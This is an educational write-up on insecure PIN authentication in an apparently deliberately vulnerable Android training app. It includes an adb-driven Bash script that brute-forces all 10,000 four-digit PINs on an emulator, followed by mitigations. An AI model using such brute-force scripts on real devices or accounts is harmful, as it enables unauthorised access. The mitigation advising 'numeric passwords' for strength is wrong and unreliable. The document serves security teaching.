# Insecure Authentication

## Introduction
Authentication is the act of confirming a user's identity. Many apps require user accounts which will naturally require authentication in order to check details for their correctness. If authentication is carried out by a 3rd party server then this section will not be relevant, but if your app uses local authentication then this guide will be something to think about.
There are two main issues that apps commonly contain. The first is the lack of attempt counter. This leaves the app vulnerable to brute force attack. The second issue is related to the first. Many apps use a 4-digit PIN as a way of securing certain content (e.g. secret folders). The issue is that 4 digit PIN codes only have 10000 combinations. Computationally this is a small number and a brute force attack would be almost instantaneous. Furthermore, according to [this website](https://datagenetics.com/blog/september32012/index.html) 20 combinations account for 26.83% of all combinations.

## Vulnerability
In this app, the log in screen not only uses a 4 digit PIN code, but it does not track the number of attempts leaving the app and authentication open to attack.
I have created a Bash script to demonstrate the ability to brute force the password on the emulator. The code for the script is below:

```
#!/usr/bin/env bash

cd C:/Users/chris/AppData/Local/Android/Sdk/platform-tools
./adb shell am start -n com.example.damnvulnerablemobileapp/.MainActivity
./adb shell input touchscreen tap 400 2100
./adb shell input touchscreen tap 540 700
./adb shell input touchscreen tap 540 350
for number in {0000..9999};
do
    ./adb shell input text "$number"
	./adb shell input touchscreen tap 900 550
done
exit 0
```

## What does this look like
In code this will be noticeable anywhere that PIN numbers are accepted. There will also be a lack of tests regarding incorrect login attempts.

## Where this can be found
Authentication can occur anywhere in an app that needs to check entered details - usually for accessing hidden content or logging into an account.

## Mitigations
As mentioned at the beginning, shifting authentication to a 3rd party server with appropriate security measures will relieve the need for checks locally in the app. If authentication must occur locally then make sure that there are time-outs associated with incorrect login attempts. Furthermore, if there is a need for passwords, always enforce numeric passwords to ensure strong password strength.